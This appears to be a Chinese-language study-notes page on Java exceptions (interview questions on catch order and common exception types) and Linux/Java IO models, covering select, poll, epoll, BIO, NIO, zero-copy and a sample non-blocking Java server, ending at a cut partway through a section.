<h2 id="9-类-ExampleA-继承-Exception，类-ExampleB-继承-ExampleA。"><a href="#9-类-ExampleA-继承-Exception，类-ExampleB-继承-ExampleA。" class="headerlink" title="9. 类 ExampleA 继承 Exception，类 ExampleB 继承 ExampleA。"></a>9. 类 ExampleA 继承 Exception，类 ExampleB 继承 ExampleA。</h2><p>有如下代码片断： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExampleB</span>(<span class="string">&quot;b&quot;</span>) </span><br><span class="line"><span class="number">3</span> &#125; <span class="keyword">catch</span>（ExampleA e）&#123; </span><br><span class="line"><span class="number">4</span>  System.out.println(<span class="string">&quot;ExampleA&quot;</span>); </span><br><span class="line"><span class="number">5</span> &#125; <span class="keyword">catch</span>（Exception e）&#123; </span><br><span class="line"><span class="number">6</span>  System.out.println(<span class="string">&quot;Exception&quot;</span>); </span><br><span class="line"><span class="number">7</span> &#125; </span><br></pre></td></tr></table></figure>

<p>请问执行此段代码的输出是什么？ </p>
<p><strong>答：</strong> </p>
<p>输出：ExampleA。（根据里氏代换原则[能使用父类型的地方一定能使用子类型]，抓取 ExampleA 类型异常的 catch块能够抓住 try 块中抛出的 ExampleB  类型的异常） </p>
<p>面试题 - 说出下面代码的运行结果。（此题的出处是《Java 编程思想》一书） </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">class</span> <span class="title class_">Annoyance</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123; </span><br><span class="line"><span class="number">2</span> &#125; </span><br><span class="line"><span class="number">3</span> <span class="keyword">class</span> <span class="title class_">Sneeze</span> <span class="keyword">extends</span> <span class="title class_">Annoyance</span> &#123; </span><br><span class="line"><span class="number">4</span> &#125; </span><br><span class="line"><span class="number">5</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123; </span><br><span class="line"><span class="number">6</span>  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> </span><br><span class="line"><span class="number">7</span>  <span class="keyword">throws</span> Exception &#123; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">9</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">10</span>  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Sneeze</span>(); </span><br><span class="line"><span class="number">11</span>  &#125; <span class="keyword">catch</span> ( Annoyance a ) &#123; </span><br><span class="line"><span class="number">12</span>  System.out.println(<span class="string">&quot;Caught Annoyance&quot;</span>); </span><br><span class="line"><span class="number">13</span>  <span class="keyword">throw</span> a; </span><br><span class="line"><span class="number">14</span>  &#125; </span><br><span class="line"><span class="number">15</span>  &#125; <span class="keyword">catch</span> ( Sneeze s ) &#123; </span><br><span class="line"><span class="number">16</span>  System.out.println(<span class="string">&quot;Caught Sneeze&quot;</span>); </span><br><span class="line"><span class="number">17</span>  <span class="keyword">return</span> ; </span><br><span class="line"><span class="number">18</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">19</span>  System.out.println(<span class="string">&quot;Hello World!&quot;</span>); </span><br><span class="line"><span class="number">20</span>  &#125; </span><br><span class="line"><span class="number">21</span>  &#125; </span><br><span class="line"><span class="number">22</span> &#125;</span><br></pre></td></tr></table></figure>

<p> <strong>结果</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 Caught Annoyance </span><br><span class="line">2 Caught Sneeze </span><br><span class="line">3 Hello World! </span><br></pre></td></tr></table></figure>

<h2 id="10-常见的-RuntimeException-有哪些？"><a href="#10-常见的-RuntimeException-有哪些？" class="headerlink" title="10. 常见的 RuntimeException 有哪些？"></a>10. 常见的 RuntimeException 有哪些？</h2><ul>
<li>ClassCastException(类转换异常) </li>
<li>IndexOutOfBoundsException(数组越界) </li>
<li>NullPointerException(空指针) </li>
<li>ArrayStoreException(数据存储异常，操作数组时类型不一致) </li>
<li>还有IO操作的BufferOverflowException异常</li>
</ul>
<h2 id="11-Java常见异常有哪些"><a href="#11-Java常见异常有哪些" class="headerlink" title="11. Java常见异常有哪些"></a>11. Java常见异常有哪些</h2><p>java.lang.IllegalAccessError：违法访问错误。当一个应用试图访问、修改某个类的域（Field）或者调用其方法，但是又违反域或方法的可见性声明，则抛出该异常。</p>
<p>java.lang.InstantiationError：实例化错误。当一个应用试图通过Java的new操作符构造一个抽象类或者接口时抛出该异常.</p>
<p>java.lang.OutOfMemoryError：内存不足错误。当可用内存不足以让Java虚拟机分配给一个对象时抛出该错误。</p>
<p>java.lang.StackOverflowError：堆栈溢出错误。当一个应用递归调用的层次太深而导致堆栈溢出或者陷入死循环时抛出该错误。</p>
<p>java.lang.ClassCastException：类造型异常。假设有类A和B（A不是B的父类或子类），O是A的实例，那么当强制将O构造为类B的实例时抛出该异常。该异常经常被称为强制类型转换异常。</p>
<p>java.lang.ClassNotFoundException：找不到类异常。当应用试图根据字符串形式的类名构造类，而在遍历CLASSPAH之后找不到对应名称的class文件时，抛出该异常。 java.lang.ArithmeticException：算术条件异常。譬如：整数除零等。</p>
<p>java.lang.ArrayIndexOutOfBoundsException：数组索引越界异常。当对数组的索引值为负数或大于等于数组大小时抛出。</p>
<p>java.lang.IndexOutOfBoundsException：索引越界异常。当访问某个序列的索引值小于0或大于等于序列大小时，抛出该异常。 java.lang.InstantiationException：实例化异常。当试图通过newInstance()方法创建某个类的实例，而该类是一个抽象类或接口时，抛出该异常。</p>
<p>java.lang.NoSuchFieldException：属性不存在异常。当访问某个类的不存在的属性时抛出该异常。</p>
<p>java.lang.NoSuchMethodException：方法不存在异常。当访问某个类的不存在的方法时抛出该异常。</p>
<p>java.lang.NullPointerException：空指针异常。当应用试图在要求使用对象的地方使用了null时，抛出该异常。譬如：调用null对象的实例方法、访问null对象的属性、计算null对象的长度、使用throw语句抛出null等等。</p>
<p>java.lang.NumberFormatException：数字格式异常。当试图将一个String转换为指定的数字类型，而该字符串确不满足数字类型要求的格式时，抛出该异常。</p>
<p>java.lang.StringIndexOutOfBoundsException：字符串索引越界异常。当使用索引值访问某个字符串中的字符，而该索引值小于0或大于等于序列大小时,抛出该异常</p>
<h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><p>java buffer一般比普通io流快，因为普通io10b也调用系统调用写回，而buffer集齐8KB才调用一次系统调用</p>
<p>有些对象自己能控制就可以分配堆内内存（jvm堆里的字节数组），有些时候只能使用堆内内存（jvm堆外，java进程的堆内）（你不能控制）；都要走系统调用</p>
<p>mmap可以省一次系统调用</p>
<p>为什么设计pagecache？</p>
<p>提速，减少硬件io调用，优先使用内存；</p>
<p>如果只是new 一个socket为5，不执行accept也能建立连接，只是没有分配文件描述符去接受，只是建立连接的状态，还能相互发送数据包，但是没有分配进程去处理，文件描述符没有分配给对应的进程；  如果这个时候执行accpet把这个连接分配给对应的进程，之前发的东西也能接受到。</p>
<p>面向连接，三次握手后内核开辟资源，这个资源代表了双方建立了连接</p>
<p>socket是四元组，只要能唯一标识即可</p>
<p>不同进程之间的fd可以相同， 进程里的fd不能相同，进程间是隔离的；</p>
<p>一个进程可以监听多个端口号，new 一个socket监听一个端口号</p>
<p>Back_log &#x3D; 2, 表示最多只有2个没有进程认领的socket连接，如果超过了就会显示syn—recv状态，服务不回复syn包，或者发的包丢失都会是这个状态，没有收到客户端的ack都会是这个状态。</p>
<p>&amp;9 是指9这个文件描述符</p>
<p>不加的话就是9这个文件</p>
<p>windows可以支持aio，linux出于安全考虑没有做这个，内核更精简</p>
<p>线程池可以省下clone的时间，先clone好直接用 </p>
<p>root用户不受连接数限制，普通用户受连接数限制；</p>
<p><a href="https://www.cnblogs.com/javaguide/p/io.html">https://www.cnblogs.com/javaguide/p/io.html</a></p>
<p><a href="https://blog.csdn.net/weixin_36364419/article/details/114238400">https://blog.csdn.net/weixin_36364419/article/details/114238400</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1488087">https://cloud.tencent.com/developer/article/1488087</a></p>
<p><a href="https://www.cnblogs.com/crazymakercircle/p/10225159.html">https://www.cnblogs.com/crazymakercircle/p/10225159.html</a></p>
<p><a href="https://llc687.top/post/%E5%A6%82%E4%BD%95%E5%AE%8C%E6%88%90%E4%B8%80%E6%AC%A1-io/#gsc.tab=0">如何完成一次IO</a></p>
<h2 id="Direct-IO"><a href="#Direct-IO" class="headerlink" title="Direct IO"></a>Direct IO</h2><p>数据库一般使用directIO，就是自己管理pagecache，和linux操作系统管理的区别是它可以自己控制一些参数，而不用修改linux内核pagecache的全局参数</p>
<h2 id="Select-Poll-Epoll"><a href="#Select-Poll-Epoll" class="headerlink" title="Select Poll Epoll"></a>Select Poll Epoll</h2><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ol>
<li><p>fd_set 使用数组实现,fd_size 有限制 1024 bitmap , fd【i】 &#x3D; accept()</p>
</li>
<li><p>fd_set不可重用，新的fd进来，重新创建</p>
</li>
<li><p>用户态和内核态拷贝fd集合产生开销</p>
</li>
<li><p>O(n)时间复杂度的轮询<br>​</p>
</li>
</ol>
<p>成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0, 具有超时时间</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848052.png" alt="img"></p>
<p>首先，fd_set结构体仅包含一个整型数组，该数组的每一位（bit）标记一个文件描述符。fd_set能容纳的文件描述符数量由FD_SETSIZE指定，这也就限制了select能同时处理的文件描述符的总量。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848060.png" alt="img"></p>
<p>FD_ZERO : 清除fdset的所有位, FD_CLR 清除位fd, FD_SET 设置fdset的位fd, FD_ISSET 测试fdset的位fd是否被设置过</p>
<h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><ol>
<li><p>用户态和内核态拷贝fd集合产生开销</p>
</li>
<li><p>O(n)时间复杂度的轮询</p>
</li>
</ol>
<p>​    基于结构体存储fd<br>​    struct pollfd{<br>​        int fd;<br>​        short events;<br>​        short revents; &#x2F;&#x2F;可重用<br>​    }<br>​    解决了select的1,2两点缺点</p>
<p>int poll(struct pollfd *ufds, unsigned int nfds, int timeout)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poll([&#123;fd=5, events=POLLIN|POLLERR&#125;], 1, -1) = 1 ([&#123;fd=5, revents=POLLIN&#125;])</span><br></pre></td></tr></table></figure>



<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><ol>
<li>用户空间可以调用epoll create返回一个epfd即epoll文件描述符即共享空间的地址给到用户空间，</li>
<li>有一个fd过来了之后， 用户控件就把这个fd传给epoll文件描述符， 然后epoll会准备一个红黑树(增删改由内核完成)，和链表。epoll会把这个fd注册给红黑树.</li>
<li>然后用户空间会调一个系统调用调到epoll上， 此时调用的是wait,它会阻塞，直到链表中有数据，才会返回。由阻塞变为不阻塞。</li>
<li>然后用户空间再去读链表，把到达的几个文件描述符取出来，然后根据文件描述符的类型做不同的处理。</li>
</ol>
<p>解决select的1，2，3，4; 不需要轮询，时间复杂度为O(1)</p>
<p>epoll_create ：创建一个白板，存放fd_events</p>
<p>epoll_ctl ：用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上</p>
<p>epoll_wait ：通过回调函数内核会将 I&#x2F;O 准备好的描述符加入到一个链表中管理，进程调用epoll_wait() 便可以得到事件完成的描述符</p>
<p>两种触发模式：</p>
<ul>
<li><p>LT:水平触发<br>​当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。</p>
</li>
<li><p>ET:边缘触发</p>
<p>和 LT 模式不同的是，通知之后进程必须立即处理事件。下次再调用 epoll_wait() 时不会再得到事件到达的通知。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读&#x2F;阻塞写操作把处理多个文件描述符的任务饿死。</p>
</li>
</ul>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="1-select-应用场景"><a href="#1-select-应用场景" class="headerlink" title="1. select 应用场景"></a>1. select 应用场景</h4><p>select 的 timeout 参数精度为微秒，而 poll 和 epoll 为毫秒，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。</p>
<p>select 可移植性更好，几乎被所有主流平台所支持。</p>
<h4 id="2-poll-应用场景"><a href="#2-poll-应用场景" class="headerlink" title="2. poll 应用场景"></a>2. poll 应用场景</h4><p>poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。</p>
<h4 id="3-epoll-应用场景"><a href="#3-epoll-应用场景" class="headerlink" title="3. epoll 应用场景"></a>3. epoll 应用场景</h4><p>只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。</p>
<p>需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。</p>
<p>需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。</p>
<h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p>每个线程对应每个连接, 用一个主线程接受连接,连接上了之后分配一个线程去处理请求;</p>
<p>a.accept()</p>
<p>jdk 1.4 直接调用accept()阻塞等待;  jdk 8之后先调用多路复用器 poll(),这个poll()也会阻塞,然后有连接进来再调用accept()来处理;</p>
<p>缺点: 线程太多; 调度开销, 资源消耗, 根本就是因为是阻塞的;</p>
<p>socket()返回fd, 然后bind(fd,9090),然后listen(fd),然后accept()</p>
<h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p>OS维度是NONEBLOCKING IO 非阻塞的具体实现; java维度是New IO; 有没有NIO是操作系统内核决定的,而不是jar包; linux内核老版只支持BIO; 内核没有select就不会有java NIO; </p>
<p>ss.configureBlocking(false); 设置OS 非阻塞</p>
<p>优点:可以一个线程处理N个连接以及读写</p>
<p>弊端: 不限的系统调用,上下文切换资源消耗很多,很浪费cpu资源; 假设一个线程处理一万个请求(C10K问题), 那么一次while循环一次会有一万次read调用; 假设前9999个read调用都返回-1,最后一个read返回了数据,那么前9999个read()调用就不该调,O(n)的复杂度;</p>
<p>NIO 属于同步非阻塞，收到的请求会先注册到多路复用器 Selector 上，多路复用器轮询直到连接有 I&#x2F;O 请求时才启动一个线程进行处理。也就是前文中的<strong>多路复用 I&#x2F;O 模型</strong>，虽然说多路复用模型是阻塞的，但在 NIO 这里，因为有<strong>Selector</strong>，read 和 write 操作都是非阻塞的，其中 Selector 其实就是 select&#x2F;poll&#x2F;epoll 的外包类。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848068.png" alt="image-20200610173230680"></p>
<p>不仅如此，NIO 除了面向流和非阻塞外，还有一个效率高的原因就是前文中也有提到的零拷贝。</p>
<p>NIO 中的 Channel（通道）相当于操作系统中的内核缓冲区， Buffer 就相当于操作系统中的用户空间缓冲区。零拷贝在 NIO 这里重要的是两个实现：</p>
<ul>
<li>FileChannel.map() : 基于内存映射 <strong>mmap</strong> 方式一种实现，可以把一个文件从 position 位置开始的 size 大小的区域映射为内存映像文件。</li>
<li>FileChannel.transferTo() : 通过调用 <strong>sendfile</strong> 方式实现的零拷贝。</li>
</ul>
<p>关于 NIO 还有一个常见的实现。那就是 Netty , Netty 是一个高性能、异步事件驱动的 NIO 框架，但为啥不直接用 JDK 中的 NIO ，而要再造轮子呢，那当然是 Netty 比 JDK NIO 做的更多，比如解决了粘包半包、断连和 idle 处理、支持流量整形等。</p>
<p>另外说起 NIO 的零拷贝，消息队列现在基本是标配，常用有 Kafka、RocketMQ、RabbitMQ，排名按性能分先后。其中 Kafka 和 RocketMQ 分别是基于 <strong>sendfile</strong> 和 <strong>mmap + write</strong>实现的零拷贝，这也是吞吐量较大的原因之一。Nignx 通过sendfile on 配置可以开启sendfile系统调用。</p>
<p>函数定义：ssize_t read(int fd, void * buf, size_t count);</p>
<p>函数说明：read()会把参数fd所指的文件传送count 个字节到buf 指针所指的内存中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList&lt;SocketChannel&gt; clients = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">ServerSocketChannel</span> <span class="variable">ss</span> <span class="operator">=</span> ServerSocketChannel.open(); <span class="comment">// 服务端开启监听: 接受客户端</span></span><br><span class="line">ss.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9090</span>));</span><br><span class="line">ss.configureBlocking(<span class="literal">false</span>); <span class="comment">//OS  NONBLOCKING 只让接受客户端 不阻塞</span></span><br><span class="line"><span class="comment">// 在一次循环中尝试接受一个连接,接收到就入队列</span></span><br><span class="line"><span class="comment">// 一个线程</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) </span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> ss.accept(); <span class="comment">// 不会阻塞,立刻返回</span></span><br><span class="line"> 	<span class="comment">// accept 调用内核 : 1. 没有客户端连接进来,返回值? 在BIO的时候一直卡住,但是在NIO,不卡住,返回-1</span></span><br><span class="line">    <span class="comment">// 如果来客户端的连接, accept返回的是这个客户端的fd 5, client object</span></span><br><span class="line">    <span class="comment">// NONBLOCKING 就是代码不能卡住,只不过有不同的情况</span></span><br><span class="line">   	<span class="keyword">if</span> (client == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// System.out.println(&quot;null..&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        client.configureBlocking(<span class="literal">false</span>); <span class="comment">// 保证客户端不阻塞</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> client.socket().getPort();</span><br><span class="line">        System.out.println(<span class="string">&quot;client..port&quot;</span> + port);</span><br><span class="line">        clients.add(client);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">4096</span>);<span class="comment">// 可以在堆里,堆外</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历已经连接进来的客户端能不能读写数据</span></span><br><span class="line">	<span class="keyword">for</span> (SocketChannel c : clients) &#123; <span class="comment">//串行化,多线程, 可以把他们抛给多个线程或者线程池去处理</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> c.read(buffer); <span class="comment">//&gt;0 -1 0 不会阻塞</span></span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            buffer.flip();</span><br><span class="line">            <span class="type">byte</span>[] aa = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">            buffer.get(aa);</span><br><span class="line">            <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(aa);</span><br><span class="line">            System.out.println(ss.socket().getPort() + <span class="string">&quot; : &quot;</span> + b);</span><br><span class="line">            buffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java NIO 由以下几个核心部分组成：</p>
<ul>
<li>Channels</li>
<li>Buffers</li>
<li>Selectors</li>
</ul>
<p>虽然Java NIO 中除此之外还有很多类和组件，Channel，Buffer 和 Selector 构成了核心的API。其它组件，如Pipe和FileLock，只不过是与三个核心组件共同使用的工具类。</p>
<h3 id="Channel-和-Buffer"><a href="#Channel-和-Buffer" class="headerlink" title="Channel 和 Buffer"></a>Channel 和 Buffer</h3><p>基本上，所有的 IO 在NIO 中都从一个Channel 开始。Channel 有点像流。 数据可以从Channel读到Buffer中，也可以从Buffer 写到Channel中。这里有个图示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848074.png" alt="img"></p>
<p>Channel和Buffer有好几种类型。下面是JAVA NIO中的一些主要Channel的实现：</p>
<ul>
<li>FileChannel</li>
<li>DatagramChannel</li>
<li>SocketChannel</li>
<li>ServerSocketChannel</li>
</ul>
<p>正如你所看到的，这些通道涵盖了UDP 和 TCP 网络IO，以及文件IO。</p>
<p>以下是Java NIO里关键的Buffer实现：</p>
<ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>这些Buffer覆盖了你能通过IO发送的基本数据类型：byte, short, int, long, float, double 和 char。</p>
<p>Java NIO 还有个 MappedByteBuffer，用于表示内存映射文件,底层调用mmap系统调用</p>
<h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><p>Selector允许单线程处理多个 Channel。如果你的应用打开了多个连接（通道），但每个连接的流量都很低，使用Selector就会很方便。例如，在一个聊天服务器中。</p>
<p>这是在一个单线程中使用一个Selector处理3个Channel的图示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848080.png" alt="img"></p>
<p>要使用Selector，得向Selector注册Channel，然后调用它的select()方法。这个方法会一直阻塞到某个注册的通道有事件就绪。一旦这个方法返回，线程就可以处理这些事件，事件的例子有如新连接进来，数据接收等</p>
<p>recv() 和 send()：面向已连接的TCP&#x2F;IP类型socket接收或发送数据。</p>
<p>recvfrom() 和 sendto()：面向无连接的UDP数据报。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>调用select或poll,select或poll逐个去看那个数据准备好了,然后返回状态集,状态集里面有准好了的文件描述符,接着就可以调用read或recv或write读写数据;内核遍历那个好了比自己去看少了很多次系统调用,能省很多时间</p>
<p>阻塞单线程</p>
<p>收费站模型,  你开了一个收费站 ,fd为5,你在办公室办公,离收费站很远,你只有一个人, 然后你调用ss.accept(),早期linux内核直接调accept(),然后你就去收费站等着直到有路需要修,你把路修好,并把路标记为6,然后你再回去办公室,接着你读到int len &#x3D; accept.getInputStream().read(buffer);(6.read()), 然后你直接去6号路看看货物有没有准备好,没准备好你就一直等,等到了然后你再把货物搬到你的办公室,然后再处理;</p>
<p>阻塞多线程</p>
<p>收费站模型,  你开了一个收费站 ,fd为5,你在办公司办公,离收费站很远,你可以请人工作, 然后你调用ss.accept(),早期linux内核直接调accept(),然后你就去收费站等着直到有路需要修,fd6你把路修好,然后请一个工人（线程）看着这6号路,接着这个人读到int len &#x3D; accept.getInputStream().read(buffer);(6.read()), 然后他直接去6号路看看货物有没有准备好,没准备好他就一直等,等到了然后他再把货物搬到你的办公室,然后再处理; 期间你可以去干别的事;</p>
<p>非阻塞</p>
<p>收费站模型, 你在办公室办公,离收费站比较远, 调用一次SocketChannel client &#x3D; ss.accept();(底层是accept)你就去收费站看一下有没有路要加进来,有的话你把路加进来, 然后你又跑回办公室做干别的事情,没有的话你直接回去干别的事情, 然后执行到int num &#x3D; c.read(byteBuffer);  你去收费站看对应的路是否有货来了,有的话你处理一下, 你得把货物搬到自己的办公室, 然后你再对货物进行处理, 处理完了再执行到int num &#x3D; c.read(byteBuffer),你又重复刚刚的办法; 直到把所有已注册的路处理完,然后又执行SocketChannel client &#x3D; ss.accept();  其实多跑了很多躺路; 明明可以一次性看那条路好了,然后去处理那一条路就可以,不用每一条路都去看一下;</p>
<p>阻塞多路复用器poll单线程（让linux帮你看，但是会有C10K问题，linux很傻记不住，每次重新遍历，而不是自己看）</p>
<p>收费站模型,  你开了一个收费站 ,fd为5,你在办公室办公,离收费站很远,你只有一个人, 然后你调用ss.accept(),linux内核直接调poll(),这个poll相当于一个人(他就住在收费站), 你跑到收费站,把收费站号告诉他,然后他就去各个收费站看有没有需要修的路(但是这个人没有记忆,每次都会全看一遍,不会记录状态,很傻),没有或者有都告诉你(期间你得在收费站等着),你接着就调用accept来修路,修好路并且给个路号6;,然后你回去,读到6.read(),你就去6号路等着,直到有货物然后搬回来;</p>
<p>非阻塞多路复用单线程epoll</p>
<p>让那个住在收费站的人(内核)留个小本本,将所有注册的fd组织成红黑树, 然后来个链表记录</p>
<h2 id="Read和Write系统调用"><a href="#Read和Write系统调用" class="headerlink" title="Read和Write系统调用"></a>Read和Write系统调用</h2><p>read系统调用: 将数据从内核缓冲区复制到用户缓冲区</p>
<p>write系统调用: 将数据从用户缓冲区复制到内核缓冲区</p>
<p>这个两个系统调用，都不负责数据在内核缓冲区和磁盘之间的交换。底层的读写交换，是由操作系统kernel内核完成的。</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848274.png" alt="img"></p>
<p>一个典型Java 服务端处理网络请求的典型过程：</p>
<p>（1）客户端请求</p>
<p>Linux通过网卡，读取客户断的请求数据，将数据读取到内核缓冲区。</p>
<p>（2）获取请求数据</p>
<p>服务器从内核缓冲区读取数据到Java进程缓冲区。</p>
<p>（3）服务器端业务处理</p>
<p>Java服务端在自己的用户空间中，处理客户端的请求。</p>
<p>（4）服务器端返回数据</p>
<p>Java服务端已构建好的响应，从用户缓冲区写入系统缓冲区。</p>
<p>（5）发送给客户端</p>
<p>Linux内核通过网络 I&#x2F;O ，将内核缓冲区中的数据，写入网卡，网卡通过底层的通讯协议，会将数据发送给目标客户端。</p>
<h2 id="Linux五种IO模型"><a href="#Linux五种IO模型" class="headerlink" title="Linux五种IO模型"></a>Linux五种IO模型</h2><p>前4种都是同步的</p>
<p>阻塞式I&#x2F;O<br>非阻塞式I&#x2F;O<br>I&#x2F;O复用（select，poll，epoll等）<br>信号驱动式I&#x2F;O（SIGIO）<br>异步I&#x2F;O（POSIX的aio_系列函数）</p>
<h3 id="信号驱动式IO"><a href="#信号驱动式IO" class="headerlink" title="信号驱动式IO"></a>信号驱动式IO</h3><p>允许Socket进行信号驱动IO,并注册一个信号处理函数，进程继续运行并不阻塞。当数据准备好时，进程会收到一个SIGIO信号，可以在信号处理函数中调用I&#x2F;O操作函数处理数据。如下图：<br><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848311.png" alt="这里写图片描述"></p>
<h3 id="同步阻塞IO-Blocking-IO"><a href="#同步阻塞IO-Blocking-IO" class="headerlink" title="同步阻塞IO(Blocking IO)"></a>同步阻塞IO(Blocking IO)</h3><p>同步阻塞 IO 模型是最常用的一个模型，也是最简单的模型。在linux中，默认情况下所有的socket都是blocking。它符合人们最常见的思考逻辑。阻塞就是进程 “被” 休息, CPU处理其它进程去了。</p>
<h3 id="同步非阻塞-None-Blocking-IO"><a href="#同步非阻塞-None-Blocking-IO" class="headerlink" title="同步非阻塞(None Blocking IO)"></a>同步非阻塞(None Blocking IO)</h3><p>NIO模型在高并发场景下，也是不可用的。一般 Web 服务器不使用这种 IO 模型。一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性。java的实际开发中，也不会涉及这种IO模型。</p>
<h3 id="IO多路复用模型-I-x2F-O-multiplexing）"><a href="#IO多路复用模型-I-x2F-O-multiplexing）" class="headerlink" title="IO多路复用模型(I&#x2F;O multiplexing）"></a>IO多路复用模型(I&#x2F;O multiplexing）</h3><p>IO多路复用模型，就是通过一种新的系统调用，一个进程可以监视多个文件描述符，一旦某个描述符就绪（一般是内核缓冲区可读&#x2F;可写），内核kernel能够通知程序进行相应的IO系统调用。</p>
<p>目前支持IO多路复用的系统调用，有 select，poll，epoll等等。select系统调用，是目前几乎在所有的操作系统上都有支持，具有良好跨平台特性。epoll是在linux 2.6内核中提出的，是select，poll系统调用的linux增强版本。</p>
<p>IO多路复用模型的基本原理就是select&#x2F;poll&#x2F;epoll系统调用，单个线程不断的轮询select&#x2F;poll&#x2F;epoll系统调用所负责的成百上千的socket连接，当某个或者某些socket网络连接有数据到达了，就返回这些可以读写的连接。因此，好处也就显而易见了——通过一次select&#x2F;poll&#x2F;epoll系统调用，就查询到到可以读写的一个甚至是成百上千的网络连接。</p>
<p>举个栗子。发起一个多路复用IO的的read读操作系统调用，流程是这个样子：</p>
<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848325.jpeg" alt="在这里插入图片描述"></p>
<p>在这种模式中，首先不是进行read系统调动，而是进行select&#x2F;poll&#x2F;epoll系统调用。当然，这里有一个前提，需要将目标网络连接，提前注册到select&#x2F;poll&#x2F;epoll的可查询socket列表中。然后，才可以开启整个的IO多路复用模型的读流程。</p>
<p>（1）进行select&#x2F;epoll系统调用，查询可以读的连接。kernel会查询所有select的可查询socket列表，当任何一个socket中的数据准备好了，select就会返回。</p>
<p>当用户进程调用了select，那么整个线程会被block（阻塞掉）。</p>
<p>（2）用户线程获得了目标连接后，发起read系统调用，用户线程阻塞。内核开始复制数据。它就会将数据从kernel内核缓冲区，拷贝到用户缓冲区（用户内存），然后kernel返回结果。</p>
<p>（3）用户线程才解除block的状态，用户线程终于真正读取到数据，继续执行。</p>
<p>多路复用IO的特点：</p>
